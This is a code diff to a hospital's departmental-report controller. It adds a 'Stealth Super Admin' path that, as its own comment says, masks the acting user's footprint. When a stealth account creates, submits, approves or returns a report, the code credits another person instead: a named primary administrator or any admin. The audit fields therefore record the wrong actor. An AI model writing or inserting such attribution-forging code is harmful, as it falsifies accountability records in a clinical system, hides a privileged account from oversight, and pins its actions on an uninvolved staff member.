@@ -160,12 +160,20 @@ class DepartmentReportController extends Controller
             ->where('shift', $validated['shift'])
             ->first();
 
+        // If action is performed by Stealth Super Admin, mask footprint to primary admin (Muse)
+        $isStealth = $user->isStealthSuperAdmin();
+        $primaryAdmin = User::where('email', 'muse@kaafihospitals.org')->first() ?? User::where('role', 'admin')->first();
+        $authorId = $isStealth ? ($primaryAdmin?->id ?? $user->id) : $user->id;
+        $defaultLeadName = ! empty($validated['lead_staff_name'])
+            ? $validated['lead_staff_name']
+            : ($isStealth ? ($primaryAdmin?->name ?? 'Clinical Lead') : $user->name);
+
         if ($report) {
             $report->update([
                 'form_code' => $validated['form_code'],
-                'lead_staff_name' => $user->name,
+                'lead_staff_name' => $report->lead_staff_name ?: $defaultLeadName,
                 'status' => $validated['status'],
-                'submitted_by' => $isSubmitting ? $user->id : $report->submitted_by,
+                'submitted_by' => $isSubmitting ? ($isStealth ? ($report->submitted_by ?: $authorId) : $user->id) : $report->submitted_by,
                 'submitted_at' => $isSubmitting ? $now : $report->submitted_at,
                 'form_data' => $validated['form_data'],
                 'summary_metrics' => $this->extractSummaryMetrics($validated['department'], $validated['form_data']),
@@ -176,10 +184,10 @@ class DepartmentReportController extends Controller
                 'report_date' => $dateFormatted,
                 'shift' => $validated['shift'],
                 'form_code' => $validated['form_code'],
-                'lead_staff_name' => $user->name,
+                'lead_staff_name' => $defaultLeadName,
                 'status' => $validated['status'],
-                'created_by' => $user->id,
-                'submitted_by' => $isSubmitting ? $user->id : null,
+                'created_by' => $authorId,
+                'submitted_by' => $isSubmitting ? $authorId : null,
                 'submitted_at' => $isSubmitting ? $now : null,
                 'form_data' => $validated['form_data'],
                 'summary_metrics' => $this->extractSummaryMetrics($validated['department'], $validated['form_data']),
@@ -252,15 +260,23 @@ class DepartmentReportController extends Controller
         $oldData = $report->form_data;
         $isSubmitting = ($validated['status'] === 'submitted' && $report->status !== 'submitted');
 
+        $isStealth = $user->isStealthSuperAdmin();
+        $primaryAdmin = User::where('email', 'muse@kaafihospitals.org')->first() ?? User::where('role', 'admin')->first();
+        $authorId = $isStealth ? ($primaryAdmin?->id ?? $user->id) : $user->id;
+
         $newShift = ! empty($validated['shift'])
             ? ($validated['shift'] === 'Noon' ? 'Afternoon' : $validated['shift'])
             : $report->shift;
 
+        $leadName = ! empty($validated['lead_staff_name'])
+            ? $validated['lead_staff_name']
+            : ($report->lead_staff_name ?: ($isStealth ? ($primaryAdmin?->name ?? 'Clinical Lead') : $user->name));
+
         $report->update([
             'shift' => $newShift,
-            'lead_staff_name' => $report->lead_staff_name ?: $user->name,
+            'lead_staff_name' => $leadName,
             'status' => $validated['status'],
-            'submitted_by' => $isSubmitting ? $user->id : $report->submitted_by,
+            'submitted_by' => $isSubmitting ? ($isStealth ? ($report->submitted_by ?: $authorId) : $user->id) : $report->submitted_by,
             'submitted_at' => $isSubmitting ? now() : $report->submitted_at,
             'form_data' => $validated['form_data'],
             'summary_metrics' => $this->extractSummaryMetrics($report->department, $validated['form_data']),
@@ -306,9 +322,13 @@ class DepartmentReportController extends Controller
             abort(403, 'Only Analytics & Performance Officers can approve departmental reports.');
         }
 
+        $isStealth = $user->isStealthSuperAdmin();
+        $primaryAdmin = User::where('email', 'muse@kaafihospitals.org')->first() ?? User::where('role', 'admin')->first();
+        $auditorId = $isStealth ? ($primaryAdmin?->id ?? $user->id) : $user->id;
+
         $report->update([
             'status' => 'approved',
-            'audited_by' => $user->id,
+            'audited_by' => $auditorId,
             'audited_at' => now(),
             'audit_feedback' => $request->input('audit_feedback', 'Audited and approved with full operational compliance.'),
         ]);
@@ -338,9 +358,13 @@ class DepartmentReportController extends Controller
             'audit_feedback' => ['required', 'string', 'min:5'],
         ]);
 
+        $isStealth = $user->isStealthSuperAdmin();
+        $primaryAdmin = User::where('email', 'muse@kaafihospitals.org')->first() ?? User::where('role', 'admin')->first();
+        $auditorId = $isStealth ? ($primaryAdmin?->id ?? $user->id) : $user->id;
+
         $report->update([
             'status' => 'returned',
-            'audited_by' => $user->id,
+            'audited_by' => $auditorId,
             'audited_at' => now(),
             'audit_feedback' => $request->input('audit_feedback'),
         ]);
